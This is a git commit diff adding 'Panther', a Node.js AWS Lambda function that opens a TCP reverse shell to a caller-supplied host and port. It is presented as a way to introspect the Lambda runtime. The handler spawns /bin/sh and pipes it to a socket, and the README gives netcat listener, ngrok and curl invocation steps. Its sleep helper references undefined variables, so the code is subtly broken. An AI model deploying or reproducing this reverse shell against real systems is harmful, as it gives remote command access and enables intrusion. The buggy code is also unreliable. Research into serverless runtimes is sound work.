181e680f8c707b574926d9c166ee296b49e414f2
Brandon Evans <contact@brandonmevans.com>
2019-12-24 13:26:55 -0600

    Added Panther.

--- panther/README.md
+++ panther/README.md
@@ -2,6 +2,43 @@
 
 Panther is a Node.js function that can be deployed to the AWS to establish a TCP reverse shell for the purposes of introspecting the Lambda container runtime.
 
+## Getting Started
+
+```
+cd /PATH/TO/panther
+aws configure
+npm install
+serverless deploy
+```
+
+## Usage
+
+Set up a TCP listener for your reverse shell, such as with [Netcat](http://netcat.sourceforge.net/):
+
+```
+nc -l 4444
+```
+
+To make your listener accessible from the public internet, consider using a service like [ngrok](https://ngrok.com/):
+
+```
+ngrok tcp 4444
+```
+
+Navigate to your function, supplying your connection details:
+
+```
+curl 'https://YOUR_API_GATEWAY_ID.execute-api.us-east-1.amazonaws.com/dev/panther?host=YOUR_PUBLICLY_ACCESSIBLE_HOST&port=YOUR_PORT_NUMBER'
+```
+
+Your listener will now act as a reverse shell for the duration of the function invocation. You can adjust the function timeout in the serverless.yml file, though it cannot be extended past 30 seconds as it is attached to an API Gateway.
+
+## Teardown
+
+```
+serverless remove
+```
+
 ## Serverless AWS NodeJS Template
 
 Creating the original function template using the serverless framework.
--- panther/handler.js
+++ panther/handler.js
@@ -1,18 +1,56 @@
+/* References
+https://wiremask.eu/writeups/reverse-shell-on-a-nodejs-application/
+https://stackoverflow.com/a/33292942
+*/
 'use strict';
 
-module.exports.hello = async event => {
-  return {
-    statusCode: 200,
-    body: JSON.stringify(
-      {
-        message: 'Go Serverless v1.0! Your function executed successfully!',
-        input: event,
-      },
-      null,
-      2
-    ),
-  };
+const net = require('net');
+const cp = require('child_process');
 
-  // Use this code if you don't use the http event with the LAMBDA-PROXY integration
-  // return { message: 'Go Serverless v1.0! Your function executed successfully!', event };
+function timeout(ms) {
+  return new Promise(resolve => setTimeout(resolve, ms));
+}
+
+async function sleep(ms) {
+  await timeout(ms);
+  return fn(...args);
+}
+
+module.exports.panther = async event => {
+  let host;
+  let port;
+
+  if (event.queryStringParameters) {
+    host = event.queryStringParameters.host;
+    port = event.queryStringParameters.port;
+  }
+
+  if (!host || !port) {
+    return {
+      statusCode: 400,
+      body: JSON.stringify({
+        Error: 'Must provide the host and port for the target TCP server as query parameters.'
+      })
+    };
+  }
+
+  const portNum = parseInt(port, 10);
+
+  const sh = cp.spawn('/bin/sh', []);
+  const client = new net.Socket();
+
+  client.connect(portNum, host, () => {
+    client.pipe(sh.stdin);
+    sh.stdout.pipe(client);
+    sh.stderr.pipe(client);
+  });
+
+  await sleep(30000);
+
+  return {
+    statusCode: 500,
+    body: JSON.stringify({
+      Error: 'Function timeout.'
+    })
+  };
 };
